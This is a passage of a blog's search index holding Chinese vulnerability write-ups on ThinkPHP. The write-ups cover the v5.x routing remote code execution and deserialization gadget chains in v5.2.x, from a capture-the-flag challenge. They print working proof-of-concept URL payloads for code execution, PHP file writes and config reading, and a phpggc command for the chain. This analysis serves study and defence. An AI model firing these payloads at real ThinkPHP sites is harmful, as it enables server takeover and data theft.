App::run()\u51fd\u6570\u4f53\u73b0\u4e86\u7a0b\u5e8f\u7684\u4e00\u4e2a\u4e3b\u8981\u6d41\u7a0b\uff0c\u4ece\u8def\u5f84\u7684\u89e3\u6790\u5230\u52a8\u6001\u89e3\u6790\u6267\u884c\u76f8\u5e94\u7684\u63a7\u5236\u5668\u53ca\u65b9\u6cd5 \u5148\u6765\u770b\u770b\u7b2c13\u884c\uff0c\u83b7\u53d6\u76f8\u5e94\u7684\u8def\u5f84\u4fe1\u606f thinkphp/library/think/App.php routeCheck()\u51fd\u6570 <pre><code>public function routeCheck()\n{\n    // \u68c0\u6d4b\u8def\u7531\u7f13\u5b58\n    ...\n\n    // \u83b7\u53d6\u5e94\u7528\u8c03\u5ea6\u4fe1\u606f\n    $path = $this-&gt;request-&gt;path();\n    // \u4eceRequest.php path\u63d0\u53d6urlpath \u5177\u4f53\u4ecepathinfo()\uff0c\u4f18\u5148\u83b7\u53d6$_GET[$this-&gt;config['var_pathinfo']]\n    // var_pathinfo \u9ed8\u8ba4\u4e3as\n\n    // \u662f\u5426\u5f3a\u5236\u8def\u7531\u6a21\u5f0f\n    $must = !is_null($this-&gt;routeMust) ? $this-&gt;routeMust : $this-&gt;route-&gt;config('url_route_must');\n\n    // \u8def\u7531\u68c0\u6d4b \u8fd4\u56de\u4e00\u4e2aDispatch\u5bf9\u8c61\n    $dispatch = $this-&gt;route-&gt;check($path, $must);//\u8fd4\u56deUrlDispatch\u7c7b\u5b9e\u4f8b\uff0c\u4ecedispatch\u7c7b\u5904\u7ee7\u627f\n\n    ...\n\n    return $dispatch;\n}\n</code></pre> \u7b2c7\u884c\u4eces\u53c2\u6570\u4e2d\u83b7\u53d6\u8def\u7531\u8def\u5f84(s\u4e3avar_pathinfo\u7684\u9ed8\u8ba4\u503c)\uff0c\u5728\u8c03\u7528routeCheck\u51fd\u6570\u540e\u8fd4\u56de\u4e00\u4e2aUrlDispatch\uff0c\u4e4b\u540e\u8c03\u7528\u4e86Url\u7c7b\u7684init\u51fd\u6570 thinkphp/library/think/route/dispatch/Url.php init <pre><code>public function init()\n{\n    // \u89e3\u6790\u9ed8\u8ba4\u7684URL\u89c4\u5219\n    $result = $this-&gt;parseUrl($this-&gt;dispatch);\n    // parseUrl\u51fd\u6570\u5904\u7406\u53c2\u6570\u503c(\u4ee5/\u5206\u5272\uff0c\u4f20\u5165|\u4e5f\u884c\u4f1a\u88ab\u66ff\u6362\u6210/\uff0c\u6700\u7ec8\u7531/\u6765\u5206\u5272)\uff0c\u8fd4\u56de[module,controller,action]\n\n    return (new Module($this-&gt;request, $this-&gt;rule, $result))-&gt;init();\n}\n</code></pre> \u8fd4\u56deModule\u5bf9\u8c61\uff0c\u7ee7\u627f\u81eaDispatch\u5bf9\u8c61\uff0c\u5e76\u4e14\u8c03\u7528\u4e86init\u51fd\u6570\uff0c\u5c06\u89e3\u6790\u540e\u7684\u8def\u7531\u586b\u5145\u5230dispatch\uff0c\u4f9b\u540e\u9762App::run()\u51fd\u6570\u52a8\u6001\u8c03\u7528dispatch\u7684run\u51fd\u6570\uff0cv5.1\u7248\u672c\u7684\u8c03\u7528\u94fe\u590d\u6742\u4e86\u4e00\u70b9\uff0c\u4f46\u662f\u5176\u5b9e\u5185\u5bb9\u540cv5.0\u7248\u672c\u7c7b\u4f3c Dispatch::run()\u51fd\u6570\u8c03\u7528\u4e86Module::exec()\u51fd\u6570 thinkphp/library/think/route/dispatch/Module.php exec() <pre><code>public function exec()\n{\n    // \u76d1\u542cmodule_init\n    $this-&gt;app['hook']-&gt;listen('module_init');\n\n    try {\n        // \u5b9e\u4f8b\u5316\u63a7\u5236\u5668\n        $instance = $this-&gt;app-&gt;controller($this-&gt;controller,\n            $this-&gt;rule-&gt;getConfig('url_controller_layer'),\n            $this-&gt;rule-&gt;getConfig('controller_suffix'),\n            $this-&gt;rule-&gt;getConfig('empty_controller'));\n\n        if ($instance instanceof Controller) {\n            $instance-&gt;registerMiddleware();\n        }\n    } catch (ClassNotFoundException $e) {\n        throw new HttpException(404, 'controller not exists:' . $e-&gt;getClass());\n    }\n    // \u95ed\u5305\u8c03\u7528\n    $this-&gt;app['middleware']-&gt;controller(function (Request $request, $next) use ($instance) {\n        // \u83b7\u53d6\u5f53\u524d\u64cd\u4f5c\u540d\n        $action = $this-&gt;actionName . $this-&gt;rule-&gt;getConfig('action_suffix');\n\n        if (is_callable([$instance, $action])) {\n            // \u6267\u884c\u64cd\u4f5c\u65b9\u6cd5\n            $call = [$instance, $action];\n\n            // \u4e25\u683c\u83b7\u53d6\u5f53\u524d\u64cd\u4f5c\u65b9\u6cd5\u540d\n            $reflect    = new ReflectionMethod($instance, $action);\n            $methodName = $reflect-&gt;getName();\n            $suffix     = $this-&gt;rule-&gt;getConfig('action_suffix');\n            $actionName = $suffix ? substr($methodName, 0, -strlen($suffix)) : $methodName;\n            $this-&gt;request-&gt;setAction($actionName);\n\n            // \u81ea\u52a8\u83b7\u53d6\u8bf7\u6c42\u53d8\u91cf\n            $vars = $this-&gt;rule-&gt;getConfig('url_param_type')\n            ? $this-&gt;request-&gt;route()\n            : $this-&gt;request-&gt;param();\n            $vars = array_merge($vars, $this-&gt;param);\n        } elseif (is_callable([$instance, '_empty'])) {\n            // \u7a7a\u64cd\u4f5c\n            $call    = [$instance, '_empty'];\n            $vars    = [$this-&gt;actionName];\n            $reflect = new ReflectionMethod($instance, '_empty');\n        } else {\n            // \u64cd\u4f5c\u4e0d\u5b58\u5728\n            throw new HttpException(404, 'method not exists:' . get_class($instance) . '-&gt;' . $action . '()');\n        }\n\n        $this-&gt;app['hook']-&gt;listen('action_begin', $call);\n\n        $data = $this-&gt;app-&gt;invokeReflectMethod($instance, $reflect, $vars);\n\n        return $this-&gt;autoResponse($data);\n    });\n\n    return $this-&gt;app['middleware']-&gt;dispatch($this-&gt;request, 'controller');\n}\n</code></pre> \u7b80\u5355\u63cf\u8ff0exec\u51fd\u6570\uff0c\u5b9e\u4f8b\u5316controller\uff0c\u7528\u4e8e\u540e\u976220\u884c\u523055\u884c\u7684\u95ed\u5305\u51fd\u6570\uff0c\u8fd9\u4e2a\u5fc5\u62a5\u51fd\u6570\u4e3b\u8981\u5b8c\u6210\u4e86\u8c03\u7528controller\u7684action\uff0c\u5e76\u83b7\u53d6\u8f93\u5165\u7684\u53c2\u6570\u503c\uff0c\u6700\u540e\u7531invokeReflectMethod\u5b8c\u6210\u4e3b\u8981\u7684\u8c03\u7528\u3002 \u6700\u7ec8\u7684\u8c03\u7528\u51fd\u6570\u4e3aRequest::filterValue\u51fd\u6570 <pre><code>private function filterValue(&amp;$value, $key, $filters)\n{\n    $default = array_pop($filters);\n\n    foreach ($filters as $filter) {\n        if (is_callable($filter)) {\n            // \u8c03\u7528\u51fd\u6570\u6216\u8005\u65b9\u6cd5\u8fc7\u6ee4\n            $value = call_user_func($filter, $value);//\u8c03\u7528\u51fd\u6570\n        } elseif (is_scalar($value)) {\n            if (false !== strpos($filter, '/')) {\n                // \u6b63\u5219\u8fc7\u6ee4\n                if (!preg_match($filter, $value)) {\n                    // \u5339\u914d\u4e0d\u6210\u529f\u8fd4\u56de\u9ed8\u8ba4\u503c\n                    $value = $default;\n                    break;\n                }\n            } elseif (!empty($filter)) {\n                // filter\u51fd\u6570\u4e0d\u5b58\u5728\u65f6, \u5219\u4f7f\u7528filter_var\u8fdb\u884c\u8fc7\u6ee4\n                // filter\u4e3a\u975e\u6574\u5f62\u503c\u65f6, \u8c03\u7528filter_id\u53d6\u5f97\u8fc7\u6ee4id\n                $value = filter_var($value, is_int($filter) ? $filter : filter_id($filter));\n                if (false === $value) {\n                    $value = $default;\n                    break;\n                }\n            }\n        }\n    }\n\n    return $value;\n}\n</code></pre> \u5230\u8fd9\u91cc\u5176\u5b9e\u601d\u8def\u5f88\u660e\u663e\uff0c\u5229\u7528/\u5206\u5272\u51fa\u80fd\u5229\u7528\u7684controller\uff0c\u5e76\u8f93\u5165\u76f8\u5e94\u7684\u53c2\u6570\u503c\uff0c\u63a5\u4e0b\u6765\u5c31\u662f\u627e\u53ef\u5229\u7528\u7684\u51fd\u6570\u3002 v5.0\u7248\u672c\u4e2dpoc\u90fd\u80fd\u7528</p> <p>\u5982\u4efb\u610f\u547d\u4ee4\u6267\u884c <code>?s=/index/think\\view\\driver\\php/display&amp;content=&lt;?php%20phpinfo();</code> \u4efb\u610f\u6587\u4ef6\u5199\u5165\uff0c\u751f\u6210\u5728index.php\u540c\u4e00\u7ea7\u76ee\u5f55 <code>?s=index/\\think\\template\\driver\\file/write&amp;cacheFile=test.php&amp;content=&lt;?php%20phpinfo();</code> \u83b7\u53d6\u914d\u7f6e\u4fe1\u606f <code>?s=index/\\think\\config/get&amp;name=database.username</code> \u9664\u6b64\u4e4b\u5916\uff0c\u8fd8\u53ef\u4ee5\u4f7f\u7528\\think\\request/input\uff08v5.0\u7248\u672c\u4e0d\u80fd\u7528\u662f\u56e0\u4e3athink\\request\u7684\u6784\u9020\u51fd\u6570\u4e3aprotected\uff0c\u4e0d\u5141\u8bb8\u52a8\u6001\u8c03\u7528\uff09 \u5982\u4efb\u610f\u4ee3\u7801\u6267\u884c <code>?s=index/\\think\\request/input&amp;data[]=123&amp;filter=phpinfo</code> invokeFunction\u6838\u5fc3ReflectionFunction <code>?s=index/\\think\\container/invokeFunction&amp;function=call_user_func&amp;vars[0]=phpinfo&amp;vars[1]=1</code> <code>?s=index/\\think\\container/invokeFunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</code> \u56e0\u4e3athink\\app\u7ee7\u627f\u81eathink\\container\uff0c\u6240\u4ee5\u6539\u6210think\\app\u4e5f\u884c \u5176\u4e2dcall_user_func\u586b\u5145\u53c2\u6570\u65f6\uff0c\u4ee5\u6570\u7ec4\u5f62\u5f0f\uff0c\u7b2c\u4e00\u4e2a\u4e3a\u51fd\u6570\u540d\uff0c\u7b2c\u4e8c\u4e2a\u4e3a\u51fd\u6570\u53c2\u6570 call_user_func_array\u586b\u5145\u53c2\u6570\u65f6\uff0c\u4ee5\u6570\u7ec4\u5f62\u5f0f\uff0c\u7b2c\u4e00\u4e2a\u4e3a\u51fd\u6570\u540d\uff0c\u7b2c\u4e8c\u4e2a\u4e3a\u51fd\u6570\u53c2\u6570\uff08\u4e5f\u4e3a\u6570\u7ec4\u5f62\u5f0f\uff09 \u8fd9\u91ccv5.1\u53ea\u80fd\u7528php7\uff0c\u5982v5.0\u8fd8\u53ef\u4ee5\u4f7f\u7528assert\u6765\u6267\u884c\u51fd\u6570</p>","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2019/thinkphp-v5.x-App.php-rce/#_7","title":"\u603b\u7ed3","text":"<p>\u8fd9\u6b21\u51fa\u7684\u8fd9\u4e2a\u6f0f\u6d1e\u5371\u5bb3\u5f88\u5927\uff0c\u6574\u4e2a\u8c03\u7528\u8fc7\u7a0b\u4e5f\u975e\u5e38\u6f02\u4eae\uff0c\u503c\u5f97\u4e00\u6b65\u4e00\u6b65\u8c03\u8bd5\u3002 \u5176\u4e2d\u6536\u83b7\u5927\u81f4\u5c31\u662f\u4e86\u89e3\u4e86thinkphp v5\u7248\u672c\u8def\u7531\u8c03\u7528\u7684\u6d41\u7a0b\uff0cv5.1\u7248\u672c\u7684\u95ed\u5305\u51fd\u6570\u6784\u9020\u7684\u65b9\u5f0f\u7ed9\u6846\u67b6\u5e26\u6765\u4e86\u4e0d\u4e00\u6837\u7684\u611f\u53d7\uff0c\u4e0d\u5f97\u4e0d\u7ed9thinkphp\u4e00\u4e2a\u8d5e</p>","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2019/thinkphp_5.2.x_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/","title":"thinkphp v5.2.x \u53cd\u5e8f\u5217\u5316\u5229\u7528\u94fe\u6316\u6398","text":"","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2019/thinkphp_5.2.x_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/#0x00","title":"0x00 \u524d\u8a00","text":"<p>\u4e0a\u5468\u53c2\u4e0e\u4e86N1CTF\uff0c\u91cc\u9762\u6709\u4e00\u9053\u5173\u4e8ethinkphp5\u7684\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684\u5229\u7528\u3002\u8bb0\u5f55\u4e00\u4e0b\u5173\u4e8e\u8be5\u53cd\u5e8f\u5217\u5316\u7684\u5229\u7528\u94fe\u5206\u6790\u3002</p> <p>\u540e\u6587\u4e3b\u8981\u5305\u62ec\u4e24\u6761\u94fe\u7684\u5229\u7528\u5206\u6790\uff08\u4e00\u6761\u662f\u6211\u627e\u7684\uff0c\u4e5f\u662f\u9898\u76ee\u7684\u9884\u671f\u89e3\uff0c\u53e6\u4e00\u6761\u662fwonderkun\u5e08\u5085\u627e\u7684\u975e\u9884\u671f\u89e3\uff09</p>","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2019/thinkphp_5.2.x_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/#0x01","title":"0x01 \u73af\u5883\u51c6\u5907","text":"<p>\u8fd9\u91cc\u5c31\u4e0d\u76f4\u63a5\u7528\u9898\u76ee\u7684\u73af\u5883\u4e86\uff0c\u91c7\u7528composer\u76f4\u63a5\u5b89\u88c55.2.*-dev\u7248\u672c</p> <pre><code>composer create-project topthink/think=5.2.x-dev v5.2\n</code></pre>","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2019/thinkphp_5.2.x_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/#0x02","title":"0x02 \u5229\u7528\u94fe\u5206\u6790","text":"","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2019/thinkphp_5.2.x_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/#_1","title":"\u80cc\u666f\u56de\u987e","text":"<p>tp5\u5728\u6211\u5370\u8c61\u91cc\u53cd\u5e8f\u5217\u5316\u7684\u5229\u7528\u94fe\u5b58\u5728\u4e00\u4e2aWindows\u7c7b\u7684\u4efb\u610f\u6587\u4ef6\u5220\u9664\uff0c\u4f46\u662f\u5728\u8fd9\u7bc7\u6587\u7ae0\u7684\u542f\u793a\u4e0b\uff0c\u4e5f\u7b97\u662f\u627e\u5230\u4e86\u4e00\u6761\u65b0\u7684\u8def\uff08\u5173\u4e8e<code>__toString</code>\u7684\u89e6\u53d1\u65b9\u5f0f\uff0c\u9664\u4e86\u5b57\u7b26\u4e32\u62fc\u63a5\u7684\u65b9\u5f0f\uff0c\u8fd8\u53ef\u4ee5\u5229\u7528PHP\u81ea\u5e26\u51fd\u6570\u53c2\u6570\u7684\u5f3a\u5236\u8f6c\u6362\uff09\u3002</p> <p>\u8fd9\u7bc7\u6587\u7ae0\u7684\u5229\u7528\u94fe\u6700\u540e\u7528\u5230\u4e865.1.37\u7248\u672c<code>think/Request.php</code>\u7684 <code>__call</code>\u51fd\u6570\uff0c\u8be5\u51fd\u6570\u7684\u8c03\u7528\u51fd\u6570\u540d\u53ef\u63a7\uff0c\u6240\u4ee5\u53ef\u4ee5\u5bfc\u81f4\u4efb\u610f\u8c03\u7528\u5176\u4ed6\u7684\u7c7b\u51fd\u6570\u3002\u800c\u57285.2.x\u7248\u672c\u4e0d\u5b58\u5728\u8fd9\u6837\u7684\u4e00\u4e2a<code>__call</code>\u51fd\u6570\uff0c\u8fd9\u610f\u5473\u7740\u6211\u4eec\u9700\u8981\u91cd\u65b0\u627e\u4e00\u4e2a\u6700\u7ec8\u8fbe\u6210\u547d\u4ee4\u6267\u884c\u7684\u51fd\u6570\u8c03\u7528\uff08<code>__call</code>\u51fd\u6570\u524d\u7684\u5229\u7528\u94fe\u4ecd\u7136\u53ef\u7528\uff09\u3002</p> <p>\u90a3\u4e48\u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u6765\u770b\u770b5.2.x\u65b0\u7684\u5229\u7528\u94fe\u5427\uff1a\uff09</p>","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2019/thinkphp_5.2.x_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/#thinkmodelconcernattributephp-getvalue","title":"think/model/concern/Attribute.php getValue\u53ef\u51fd\u6570\u52a8\u6001\u8c03\u7528\u51fd\u6570\uff08\u9898\u76ee\u7684\u9884\u671f\u89e3\uff09","text":"<p>\u7531\u4e8e5.1.37<code>__call</code>\u51fd\u6570\u524d\u7684\u5229\u7528\u94fe\u4ecd\u7136\u5b58\u5728\u4e8e5.2.x\u7248\u672c\uff0c\u8fd9\u91cc\u5c31\u4e0d\u518d\u8be6\u8ff0\u4e86\u3002</p> <p>\u5148\u6765\u770b\u4e00\u4e0bConversion\u7c7b\u7684toArray\u51fd\u6570</p> <pre><code>public function toArray(): array\n{\n    // ...\n    // \u5408\u5e76\u5173\u8054\u6570\u636e\n    $data = array_merge($this-&gt;data, $this-&gt;relation);\n\n    foreach ($data as $key =&gt; $val) {\n        if ($val instanceof Model || $val instanceof ModelCollection) {\n            // ...\n        } elseif (isset($this-&gt;visible[$key])) {\n            $item[$key] = $this-&gt;getAttr($key);// relation\u548cvisible\u5b58\u5728\u540c\u4e00\u4e2akey\u5c31\u884c\n        // ...\n    }\n\n    // ...\n</code></pre> <p>\u53bb\u6389\u4e86\u65e0\u5173\u7684\u4ee3\u7801\uff0c\u8fd9\u91cc<code>$this-&gt;visible</code>\u3001<code>$this-&gt;relation</code>\u5747\u53ef\u63a7\uff0c\u53ef\u4f2a\u9020\u6570\u636e\u8fdb\u5165<code>getAttr</code>\u51fd\u6570</p> <pre><code>public function getAttr(string $name)\n{\n    // ...\n    return $this-&gt;getValue($name, $value, $relation);\n}\n\nprotected function getValue(string $name, $value, bool $relation = false)\n{\n  // \u68c0\u6d4b\u5c5e\u6027\u83b7\u53d6\u5668\n  $fieldName = $this-&gt;getRealFieldName($name);// \u76f4\u63a5\u8fd4\u56de$name\u7684\u503c\n    // ...\n  if (isset($this-&gt;withAttr[$fieldName])) {\n    // ...\n    $closure = $this-&gt;withAttr[$fieldName]; // withAttr\u5185\u5bb9\u53ef\u63a7\n    $value   = $closure($value, $this-&gt;data); // \u52a8\u6001\u8c03\u7528\u51fd\u6570\n      // ...\n</code></pre> <p>\u76f4\u63a5\u5173\u6ce8<code>getValue</code>\u51fd\u6570\uff0c\u8be5\u51fd\u6570\u53ef\u52a8\u6001\u8c03\u7528\u51fd\u6570\uff0c\u5e76\u4e14\u8c03\u7528\u51fd\u6570\u3001\u51fd\u6570\u53c2\u6570\u5747\u53ef\u63a7\u3002\u6240\u4ee5\u63a5\u4e0b\u6765\u6709\u4e24\u79cd\u65b9\u6cd5\uff0c\u7b2c\u4e00\u79cd\u662f\u627e\u4e00\u4e2a\u7b26\u5408\u6761\u4ef6\u7684php\u51fd\u6570\uff0c\u53e6\u4e00\u79cd\u662f\u5229\u7528tp\u81ea\u5e26\u7684SerializableClosure\u8c03\u7528\uff0c\u6765\u770b\u4e00\u4e0b\u7b2c\u4e8c\u79cd\u3002</p> <p>\\Opis\\Closure\u53ef\u7528\u4e8e\u5e8f\u5217\u5316\u533f\u540d\u51fd\u6570\uff0c\u4f7f\u5f97\u533f\u540d\u51fd\u6570\u540c\u6837\u53ef\u4ee5\u8fdb\u884c\u5e8f\u5217\u5316\u64cd\u4f5c\u3002\u8fd9\u610f\u5473\u7740\u6211\u4eec\u53ef\u4ee5\u5e8f\u5217\u5316\u4e00\u4e2a\u533f\u540d\u51fd\u6570\uff0c\u7136\u540e\u4ea4\u7531\u4e0a\u8ff0\u7684<code>$closure($value, $this-&gt;data)</code>\u8c03\u7528\u6267\u884c\u3002</p> <pre><code>$func = function(){phpinfo();};\n$closure = new \\Opis\\Closure\\SerializableClosure($func);\n$closure($value, $this-&gt;data);// \u8fd9\u91cc\u7684\u53c2\u6570\u53ef\u4ee5\u4e0d\u7528\u7ba1\n</code></pre> <p>\u4ee5\u4e0a\u8ff0\u4ee3\u7801\u4e3a\u4f8b\uff0c\u5c06\u8c03\u7528phpinfo\u51fd\u6570\u3002</p> <p>\u5230\u6b64\u4e3a\u6b62\uff0c\u6211\u4eec\u5206\u6790\u5b8c\u4e86\u6574\u4e00\u4e2a\u8c03\u7528\u6d41\u7a0b\uff0c\u56de\u987e\u4e00\u4e0b</p> <ol> <li><code>vendor/topthink/framework/src/think/process/pipes/Windows.php</code> <code>__destruct</code> -&gt;<code>removeFiles</code> -&gt;<code>file_exists</code> \u5f3a\u5236\u8f6c\u5316\u5b57\u7b26\u4e32<code>filename</code>\uff0c\u8fd9\u91cc\u7684<code>filename</code>\u53ef\u63a7     \u53ef\u89e6\u53d1<code>__toString</code>\u51fd\u6570\uff0c\u4e0b\u4e00\u6b65\u627e\u53ef\u5229\u7528\u7684<code>__toString</code></li> <li><code>vendor/topthink/framework/src/think/model/concern/Conversion.php</code> <code>__toString</code> -&gt; <code>toJson</code> -&gt; <code>toArray</code>\u521b\u9020\u7b26\u5408\u6761\u4ef6\u7684<code>relation</code>\u548c<code>visible</code>-&gt; <code>getAttr</code>     \u4e0b\u4e00\u6b65\u8c03\u7528<code>vendor/topthink/framework/src/think/model/concern/Attribute.php</code>\u7684<code>getValue</code>\u51fd\u6570</li> <li><code>vendor/topthink/framework/src/think/model/concern/Attribute.php</code> <code>getValue</code> -&gt; <code>$closure</code>\u52a8\u6001\u8c03\u7528\u51fd\u6570\uff0c\u4e14\u8be5\u5185\u5bb9\u53ef\u63a7   \u4e0b\u4e00\u6b65\u5229\u7528\u6709\u4e24\u79cd\uff0c\u4e00\u79cd\u627e\u7b26\u5408\u7684php\u51fd\u6570\uff0c\u53e6\u4e00\u79cd\u5229\u7528tp\u81ea\u5e26\u7684<code>SerializableClosure</code>\u8c03\u7528</li> <li><code>vendor/opis/closure/src/SerializableClosure.php</code>   \u6784\u9020\u53ef\u5229\u7528\u7684\u533f\u540d\u51fd\u6570</li> </ol> <p>\u6211\u628aexp\u96c6\u6210\u5230\u4e86phpggc\u4e0a\uff0c\u4f7f\u7528\u5982\u4e0b\u547d\u4ee4\u5373\u53ef\u751f\u6210</p> <pre><code>./phpggc -u ThinkPHP/RCE1 'phpinfo();'\n</code></pre> <p>\u8fd9\u91cc\u7531\u4e8e\u7528\u5230\u4e86SerializableClosure\uff0c\u9700\u8981\u4f7f\u7528\u7f16\u7801\u5668\u7f16\u7801\uff0c\u4e0d\u53ef\u76f4\u63a5\u8f93\u51fa\u62f7\u8d1d\u5229\u7528\u3002</p>","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2019/thinkphp_5.2.x_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/#thinkdbphp-__call","title":"think/Db.php __call\u51fd\u6570\u53ef\u5b9e\u4f8b\u5316\u4efb\u610f\u7c7b\uff08\u9898\u76ee\u7684\u975e\u9884\u671f\u89e3\uff09","text":"<p>\u524d\u9762\u8bf4\u52305.1.37\u7248\u672c\u7684\u5229\u7528\u94fe\u7684<code>__call</code>\u51fd\u6570\uff0c\u57285.2.x\u7248\u672c\u6ca1\u529e\u6cd5\u7528\u4e86\u3002\u4f46\u662f\u4ece<code>__destruct</code>\u5230<code>__call</code>\u7684\u94fe\u8def\u662f\u901a\u7684\uff0c\u6211\u4eec\u53ea\u9700\u8981\u91cd\u65b0\u627e\u4e00\u4e2a\u53ef\u7528\u7684<code>__call</code>\u51fd\u6570\u5373\u53ef\u3002</p> <p>\u6765\u770b\u4e00\u4e0b<code>vendor/topthink/framework/src/think/Db.php</code>\u7684<code>__call</code>\u51fd\u6570</p> <pre><code>public function __call($method, $args)\n{\n    $class = $this-&gt;config['query'];\n\n    $query = new $class($this-&gt;connection);\n\n    return call_user_func_array([$query, $method], $args);\n}\n</code></pre> <p><code>$this-&gt;config</code>\u548c<code>$this-&gt;connection</code>\u5747\u53ef\u63a7\uff0c\u8fd9\u610f\u5473\u7740\u6211\u4eec\u53ef\u4ee5\u5b9e\u4f8b\u5316\u4efb\u610f\u7b26\u5408\u6761\u4ef6\u7684\u7c7b\uff0c\u8fd9\u91cc\u627e\u4e86<code>think\\Url</code></p> <pre><code>public function __construct(App $app, array $config = [])\n{\n    $this-&gt;app    = $app;\n    $this-&gt;config = $config;\n\n    if (is_file($app-&gt;getRuntimePath() . 'route.php')) {\n        // \u8bfb\u53d6\u8def\u7531\u6620\u5c04\u6587\u4ef6\n        $app-&gt;route-&gt;import(include $app-&gt;getRuntimePath() . 'route.php');\n    }\n}\n</code></pre> <p>\u8be5\u6784\u9020\u5668\u5f15\u5165\u4e86RuntimePath\u4e0b\u7684route.php\u6587\u4ef6\uff0c\u56e0\u4e3a\u8fd9\u9053\u9898\u662f\u5141\u8bb8\u4e0a\u4f20\u6587\u4ef6\u7684\uff0c\u6240\u4ee5\u53ea\u8981\u5728\u53ef\u4e0a\u4f20\u7684\u76ee\u5f55\u4e0b\u4e0a\u4f20\u4e00\u4e2aroute.php\u7684webshell\u5373\u53ef\u3002\u81f3\u4e8eRuntimePath\uff0c<code>$app</code>\u4e3a\u53ef\u63a7\u53d8\u91cf\uff0c\u76f4\u63a5\u4fee\u6539<code>$runtimePath</code>\u7684\u5185\u5bb9\u5373\u53ef\u3002</p> <p>\u6211\u4eec\u76f4\u63a5\u6784\u9020App\u5bf9\u8c61\u4e3a</p> <pre><code>class App{\n\n    protected $runtimePath;\n    public function __construct(string $rootPath = ''){\n        $this-&gt;rootPath = $rootPath;\n        $this-&gt;runtimePath = \"/tmp/\";\n        $this-&gt;route = new \\think\\route\\RuleName();\n    }\n}\n</code></pre> <p>\u8fd9\u4e2a\u6784\u9020\u601d\u8def\u592a\u6e9c\u4e86\uff0c\u819c\u4e00\u6ce2\uff1a\uff09</p> <p>\u6574\u7406\u4e00\u4e0b\u8fc7\u7a0b</p> <ol> <li><code>vendor/topthink/framework/src/think/process/pipes/Windows.php</code> <code>__destruct</code> -&gt;<code>removeFiles</code> -&gt;<code>file_exists</code> \u5f3a\u5236\u8f6c\u5316\u5b57\u7b26\u4e32<code>filename</code>\uff0c\u8fd9\u91cc\u7684<code>filename</code>\u53ef\u63a7    \u53ef\u89e6\u53d1<code>__toString</code>\u51fd\u6570\uff0c\u4e0b\u4e00\u6b65\u627e\u53ef\u5229\u7528\u7684<code>__toString</code></li> <li><code>vendor/topthink/framework/src/think/model/concern/Conversion.php</code> <code>__toString</code> -&gt; <code>toJson</code> -&gt; <code>toArray</code>-&gt;<code>appendAttrToArray</code>-&gt;<code>$relation</code>\u8c03\u7528\u4e0d\u5b58\u5728\u7684\u51fd\u6570\uff0c\u89e6\u53d1<code>__call</code></li> <li><code>vendor/topthink/framework/src/think/Db.php</code> <code>__call</code> -&gt; <code>new $class($this-&gt;connection)</code> \u8c03\u7528\u4efb\u610f\u7c7b\u7684<code>__construct</code>\u51fd\u6570</li> <li><code>vendor/topthink/framework/src/think/Url.php</code>    \u6784\u9020App\u7c7b\uff0c\u8fbe\u5230<code>include</code>\u4efb\u610f\u6587\u4ef6\u7684\u6548\u679c</li> </ol>","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2019/thinkphp_6.0.x_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/","title":"thinkphp v6.0.x \u53cd\u5e8f\u5217\u5316\u5229\u7528\u94fe\u6316\u6398","text":"","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2019/thinkphp_6.0.x_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/#0x00","title":"0x00 \u524d\u8a00","text":"<p>\u4e0a\u4e00\u7bc7\u5206\u6790\u4e86tp 5.2.x\u7684\u53cd\u5e8f\u5217\u5316\u5229\u7528\u94fe\u6316\u6398\uff0c\u987a\u7740\u601d\u8def\uff0c\u628atp6.0.x\u4e5f\u6316\u4e86\u3002\u6709\u7c7b\u4f3c\u7684\u5730\u65b9\uff0c\u4e5f\u6709\u9700\u8981\u91cd\u65b0\u6316\u6398\u7684\u5730\u65b9\u3002</p>","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2019/thinkphp_6.0.x_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/#0x01","title":"0x01 \u73af\u5883\u51c6\u5907","text":"<p>\u91c7\u7528composer\u5b89\u88c56.0.*-dev\u7248\u672c</p> <pre><code>composer create-project topthink/think=6.0.x-dev v6.0\n</code></pre>","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2019/thinkphp_6.0.x_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/#0x02","title":"0x02 